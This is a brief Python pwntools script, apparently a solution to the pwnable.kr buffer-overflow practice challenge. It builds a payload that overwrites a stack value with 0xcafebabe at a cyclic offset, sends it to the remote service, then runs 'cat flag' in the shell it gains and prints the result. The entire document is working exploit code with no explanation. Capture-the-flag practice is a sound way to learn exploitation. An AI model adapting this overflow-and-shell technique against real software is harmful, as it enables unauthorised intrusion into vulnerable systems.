from pwn import *

payload = flat({
    cyclic_find(0x6161616e) : p32(0xcafebabe)
}) 

log.info(f"Payload {payload}")

io = remote('pwnable.kr', 9000)
io.sendline(payload)
io.sendline(b'cat flag')
log.info(f"FLAG: {io.recvline().decode()}")
